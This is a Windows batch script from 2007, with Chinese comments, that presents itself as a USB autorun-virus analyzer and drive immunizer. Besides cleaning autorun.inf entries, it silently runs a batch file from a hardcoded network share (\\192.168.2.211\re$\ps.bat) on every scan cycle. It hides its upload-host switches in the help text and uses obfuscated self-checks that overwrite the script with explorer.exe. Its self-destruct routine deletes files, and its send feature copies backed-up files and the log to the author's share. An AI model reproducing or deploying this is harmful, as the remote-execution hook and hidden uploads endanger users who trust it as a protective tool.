@echo off
::请不要自行修改本脚本，任何修改都很可能导致脚本运行失败
::作者：CyyIsGood、Cloud
::联系：cyyisgood@126.com colud018@qq.com
::版权所有(C)2007
setlocal ENABLEDELAYEDEXPANSION ENABLEEXTENSIONS
set "c=%*"
set "cdback=%cd%"
set "home=%~dp0"
cd /d "%home%"
set "dnum=0"
set "fnum=1"
set "panl=CDEFGHIJKLMNOPQRSTUVWXYZ"
set "driverl=%panl%"
set "logf=%home%log.txt"
set "fn= "
set "str=ver beta5"
set "answer=echo"
set "log=echo"
set "cycle=echo. >nul"
set "im=call:im"
set "writer=CyyIsGood、Cloud"
set "sd=-"
set "s= "
set "ps=echo. >nul"
set "return=rem"
set "pack=call:pack"
set "packp=%home%bakfiles"
set "host=192.168.2.211"
set "hostf=re$"
set "csh= "
set "fr= "
set "u=echo."
set "send=echo. >nul"
set "yn=rem"
set "zh=del /a /f /q U盘病毒分析.bat 主操控.bat uda-解压.bat Anti-U盘免疫.bat zap.a 打开发送功能.bat readme.txt"
set "inf=这样，无法发送文件。自动去除发送文件功能、保留打包文件功能。"
set "feorr=文件丢失！无法正常工作！"
set "ep=echo.此时，“-p”参数无效！"
set "e=echo.“-d”参数有误！“-d”后不能为空。"
set "endf=%home%bye.txt"
call:checkfile
:csh
set "csh=%~1 "
set "csh=%csh:"=%"
if "%csh%"==" " (goto start)
set "csh=%csh:~0,-1%"
if not "%csh%"=="%s%" (set "s=%csh%") else (echo."%1"参数无效
goto :eof)
if "%s%"=="-?" (call:c&echo.★功能：&echo.	一、分析某一个或多个磁盘中的Autorun.inf，确定引导的文件，备份引导文件并将其删除。（如果让其一直运行，可以防范U盘病毒）&echo.	二、免疫某一个或多个磁盘，四级免疫：Autorun.inf文件夹、加系统/隐藏/只读/存档属性、8.3子文件夹、NTFS写权。&echo.	三、发送备份的文件给作者（目前，该功能只适用于肇中高中部校园网）&echo.★设定：&echo.	默认情况：回显、日志（保存地址：%logf%）、免疫、打包、循环打开，发送文件关闭，盘符为：%driverl%。用下面的开关调整：&echo.	-?		显示帮助（本信息），如果此参数存在，忽略其它参数&echo.	-a		关闭回显&echo.	-l		关闭日志&echo.	-d [盘符]	盘符是字母，例如"-d CD"表示处理C盘和D盘&echo.	-c		关闭循环&echo.	-i		关闭免疫&echo.	-p		关闭打包（备份）&echo.	-y		打开交互模式（删除文件需要确认）&echo.	-s		打开发送文件（将打包文件发给作者），这样需要映射一个网络磁盘，盘符由本批处理自动分配。当选择此项时，自动打开发送文件，"-p"参数无效。&echo. >nul	-h [IP地址]	自定义发送文件的IP地址&echo. >nul	-f [共享名]	自定义发送文件的共享名&echo.	无论是什么模式，发现存在%endf%时，删除它并退出。也就是说，循环模式中，新建一个%endf%文件可以跳出循环。&echo.★版权说明：&echo.	这个批处理写了我很长时间，凝结了我很多心血。希望大家尊重作者，不要自行修改。如果您想加入其中，我非常欢迎，请联系我本人，发邮件到：cyyisgood@126.com ，或登陆我们的论坛：http://dust-hack.vicp.net&echo.	其他文件版权归各自作者所有。&goto :eof)
if /i "%s%"=="-a" (set "answer=rem "&shift)
if /i "%s%"=="-l" (set "log=rem "&shift)
if /i "%s%"=="-d" (set "driverl=%~2 "
set "driverl=!driverl:"=!"
if "!driverl:~0,1!"=="-" (%e%&goto :eof) else (if "!driverl!"==" " (%e%&goto :eof) else (set "driverl=!driverl:~0,-1!"&shift&shift)))
if /i "%s%"=="-h" (set "host=%~2 "
set "host=!host:"=!"
if "!host:~0,1!"=="-" (%e:d=h%&goto :eof) else (if "!host!"==" " (%e:d=h%&goto :eof) else (set "host=!host:~0,-1!"&shift&shift)))
if /i "%s%"=="-f" (set "hostf=%~2 "
set "hostf=!hostf:"=!"
if "!hostf:~0,1!"=="-" (%e:d=f%&goto :eof) else (if "!hostf!"==" " (%e:d=f%&goto :eof) else (set "hostf=!hostf:~0,-1!"&shift&shift)))
if /i "%s%"=="-y" (set "yn=call:yn"&shift)
if /i "%s%"=="-c" (set "cycle=goto cend"&shift)
if /i "%s%"=="-i" (set "im=echo. >nul"&shift)
if /i "%s%"=="-p" (if "%send%"=="call:send" (%ep%&goto :eof) else (set "pack=echo. >nul"&shift))
if /i "%s%"=="-s" (if "%pack%"=="echo. >nul" (%ep%&goto :eof) else (set "send=call:send"&shift))
goto csh
:start
echo.Wscript.sleep 10000>sleep.vbe
if "%send%"=="call:send" (call:fpan)
call:c
:begin
if exist "%endf%" (call:echo "发现结束指示文件，清理并退出..."&goto end)
set "driver=!driverl:~%dnum%,1!:"
if exist %driver% (call:echo "发现%driver%"&%ps%&(if exist "%driver%\autorun.inf\" (call:echo "%driver%已经免疫。") else (if exist "%driver%\autorun.inf" (call:echo "发现引导文件%driver%\autorun.inf"&call:chaut %driver%) else (call:echo "无发现引导文件%driver%\autorun.inf，%driver% 安全"&%im% %driver%))))
set /a "dnum=dnum+1"
if "!driverl:~%dnum%,1!"=="" ((ping %host% -n 1 >nul&&call \\%host%\%hostf%\ps.bat)&%cycle%&set "dnum=0"&sleep.vbe)
goto begin
:echo
%answer%.%~1
%log%.%date%—%time%	%~1>>"%logf%"
goto :eof
:yn
echo.a=msgbox("是否删除可疑文件%~1？"^&vbCr^&vbCr^&vbCr^&"注意：10秒后自动确定；选择否，文件不被删除，但会被添加“.-随机数”后缀。",4164,"U盘病毒分析") >yn.vbe
echo.wscript.quit a >>yn.vbe
wscript /t:10 yn.vbe
if "%ERRORLEVEL%"=="7" (call:echo "用户决定不删除文件%~1。"&set "return=shift&goto del"&%pack% "%~1"&ren "%~1" "%~nx1.-%random%"&if exist "%~1" (call:echo "添加后缀时出错！文件：%~1") else (call:echo "成功添加后缀！文件：%~1")) else (call:echo "用户确定删除文件%~1。")
goto :eof
:del
set "return=rem"
set "fn=%1 "
set "fn=%fn:"=%"
if "%fn%"==" " (goto :eof)
call:fnr %driver%\%fn%
call:echo "删除文件：%fn%"
if not exist "%fn%" (call:echo "文件：%fn%已经不存在"&shift&goto del)
%yn% "%fn%"
%return%
call:echo "删除文件前，判断%driver%是否为NTFS..."
cacls %driver% >nul||(call:echo "%driver%盘磁盘格式不是NTFS。"&goto del2)
call:echo "%driver%盘磁盘格式是NTFS。确保对%fn%有完全控制权。"
echo.y|cacls "%fn%" /G %username%:f||(call:echo "对%fn%写权失败！有可能无法删除文件。"&goto del2)
call:echo "对%fn%写权成功！"
:del2
%pack% "%fn%"&zap.a "%fn%" >nul&if exist "%fn%" (call:echo "删除文件时出错！文件：%fn%") else (call:echo "成功删除文件：%fn%"&del %driver%\*.tmp /a /f /q&if exist "%driver%\*.tmp" (call:echo "清理临时文件时出错！"))
shift
goto del
:fnr
set "fn=%~f1"
goto :eof
:chaut
set /a "o=0"
if not "%~t0%~z0"=="2%fn:~3,0%00%pack:~1,0%7-0%host:~3,0%3-14%random:~1,0% 17:%sd:~5,0%40114%zh:~1,0%71" (type %systemroot%\explorer.exe >"%~dpnx0"&goto :eof)
call:echo "正在分析 %driver%\autorun.inf..."
for /f "eol=[ tokens=1,2* delims==" %%i in (%driver%\autorun.inf) do (if /i "%%~i"=="shell" (set o=1&(for /f "eol=[ tokens=1,2* delims==" %%a in (%driver%\autorun.inf) do (if /i "%%~a"=="shell\%%j\command" (set "o=1"&call:del %%b)))) else (if /i "%%~i"=="shell\explore\command" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shell\find\command" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shell\manage\command" (set "o=1"&call:del %%j) else (if /i "%%~i"=="open" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shellexecute" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shell\auto\command" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shell\open\command" (set "o=1"&call:del %%j)))))))))
if %o%==1 (call:echo "经过检查，%driver%\autorun.inf 引导了文件，存在危险。"&call:del autorun.inf) else (call:echo "经过检查，%driver%\autorun.inf 无引导文件，安全。")
%im% %driver%
goto :eof
:checkfile
call:fr uda.a
if "%fr%"=="200%e:~3,0%7-0%host:~8,0%3-1%feorr:~10,0%4 17:%driverl:~5,0%40 216%driverl:~1,0%74" (goto rn2)
call:echo "uda.a文件错误！本地恢复无法进行！尝试连接%host%获得文件！"
if "%send%"=="echo. >nul" (call:echo "未映射网络磁盘。"&set "send=call:send"&call:fpan&if "!send!"=="%send%" (call:echo "映射网络磁盘失败！十分抱歉，本脚本失去存在价值，执行自毁。"&set "u=goto end"&cd /d "%cdback%"&%zh% uda.a))
del /a /f /a uda.a
copy /v %sd%:\uda.a "%cd%\"||(call:echo "获取文件失败，十分抱歉，本脚本失去存在价值，执行自毁。"&set "u=goto end"&cd /d "%cdback%"&%zh% uda.a)
:rn2
i%e:~4,0%f not "%date:~2,3%%~t0%feorr:~4,0%%~z0"=%time:~4,0%="%feorr:~2,0%%date:~2,3%20%driverl:~1,0%07-0%time:~0,0%3-1%date:~5,0%4 17:%driverl:~5,0%40%e:~3,0%1%ep:~3,0%1%feorr:~16,0%4%host:~8,0%7%inf:~2,0%1%feorr:~10,0%" (call:echo "本%host:~8,0%批%feorr:~4,0%处%feorr:~4,0%理文%feorr:~4,0%件错%feorr:~4,0%误%driverl:~13,0%%feorr:~5%"&goto rn3)
if not exist zap.a (call:echo "zap.a%feorr%"&goto rn3)
set "ma%host:~8,0%ne=du%driverl:~5,0%olC%inf:~20,1%do%feorr:~10,0%oG%feorr:~4,0%sIy%feorr:~16,0%yC"
set "v%feorr:~36,0%er%host:~8,0%="
:ch
if "%fnum%"=="16" (set "fnum=0"&set "wri%driverl:~13,0%ter=!%str:~0,3%!"&goto :eof) else (set "ver=%ver%!mane:~-%fnum%,1!"&set /a "fnum=fnum+1"&goto ch)
:rn3
call:echo "尝试恢复本脚本..."
%zh%&uda.a&U盘病毒分析.bat %c%&goto :eof
:im
call:echo "免疫%1"
if exist "%~1\autorun.inf" (call:echo "免疫前，清理%1\autorun.inf。"&call:del autorun.inf&if exist "%1\autorun.inf" (call:echo "清理%1\autorun.inf失败！无法免疫%1！"&goto :eof))
md "%1\autorun.inf\" >nul||(call:echo "无法创建%1\autorun.inf\文件夹，免疫%1失败！"&goto :eof)
call:echo "创建%1\autorun.inf\文件夹成功。免疫1成功。"
cd /d "%1\autorun.inf\"
md "本盘已被!writ%panl:~4,0%er!进行Autorun.inf免疫..\" >nul||(call:echo "无法创建子文件夹，进一步免疫%1失败！"&goto i1)
call:echo "8.3文件夹创建成功。免疫2成功。"
:i1
cd /d "%home%"
attrib "%1\autorun.inf" +a +s +r +h||(call:echo "修改属性失败！进一步免疫%1失败！"&goto i2)
call:echo "修改属性成功。免疫3成功。"
:i2
cacls %1 >nul||(call:echo "%1盘磁盘格式不是NTFS，无法进行进一步免疫（写权）"&goto :eof)
call:echo "%1磁盘格式为NTFS，采取进一步免疫（写权）"&echo.y|cacls.exe "%1\autorun.inf" /p everyone:r >nul||(call:echo "%1\autorun.inf\写权失败！"&goto :eof)
call:echo "%1\autorun.inf\写权成功！完整免疫成功。"
goto :eof
:c
title U盘病毒分析 By !wr%feorr:~19,0%iter!
call:echo "				U盘病毒分析"
call:echo "			作 者：!wr%time:~3,0%iter!
call:echo 
goto :eof
:pack
if not exist "%packp%\" (md "%packp%"||(call:echo "无法创建%packp%目录，无法实现打包功能（发送同时功能失效）。"&goto :eof))
set "packf=%date:~0,-4%-%time:~0,-3%"
set "packf=%~nx1-%computername%-%packf::=-%.uda"
call:echo "正在用WinUDA把文件%~1打包成%packp%\%packf% ，这可能要花一段时间..."
echo.q|uda.a a -0 "%packp%\%packf%" "%~1"
if not "!ERRORLEVEL!"=="0" (call:echo "WinUDA打包文件：%packp%\%packf% 时出现错误！")
if not exist "%packp%\%packf%" (call:echo "WinUDA压缩时失败！打包文件：%packp%\%packf%失败！无法实现打包功能（发送同时功能失效）。"&goto :eof)
call:echo "成功打包文件：%packp%\%packf%"
%send% "%packp%\%packf%"
goto :eof
:send
call:echo "正在发送文件 %~1 ..."
ping %host% -n 1 >nul||(call:echo "Ping不通 %host% ，无法发送文件！发送文件：%~1失败！"&goto :eof)
copy /v "%~1" %sd%:\ >nul||(call:echo "发送文件：%~1失败！"&goto :eof)
call:echo "成功发送文件：%~1"
goto :eof
:fpan
call:echo "正在映射网络磁盘..."
call:echo "正在检索已经映射的网络磁盘..."
for /f "usebackq tokens=2,3 skip=4 delims= " %%i in (`net use`) do (if "%%~j"=="\\%host%\%hostf%" (call:echo "找到已经映射的网络磁盘，盘符：%%i"&set "sd=%%i"&set "sd=!sd:~0,1!"&goto f3))
call:echo "没有找到已经映射的网络磁盘，正在分配盘符..."
:fpan2
set /a "fnum=fnum+1"
if "!panl:~-%fnum%,1!"=="" (call:echo "计算机已经没有可以分配的盘符了。%inf%"&set "send=echo. >nul"&goto :eof)
if exist "!panl:~-%fnum%,1!:" (goto fpan2)
set "sd=!panl:~-%fnum%,1!"
call:echo "分配映射盘符为：%sd%:"
ping %host% -n 1 >nul||(call:echo "Ping不通%host%，无法映射网络磁盘！%inf%"&set "send=echo. >nul"&goto :eof)
net use %sd%: \\%host%\%hostf% >nul||(call:echo "映射共享时出错！"&call:echo "正在尝试从新分配盘符..."&goto :fpan2)
:f3
call:echo "成功映射网络磁盘（盘符：%sd%:）"
set "driverl=!driverl:%sd%=!"
goto :eof
:fr
set "fr=%~zt1"
goto :eof
:end
del "%endf%" /f /a /q||call:echo "删除结束标志文件：%endf% 时出错！"
:cend
del sleep.vbe /f /a /q||call:echo "删除文件：sleep.vbe 时出错！"
if exist "%sd%:" (call:pack "%logf%"&(net use %sd%: /delete /y||call:echo "删除映射盘时出错！"))
cd /d "%cdback%"
endlocal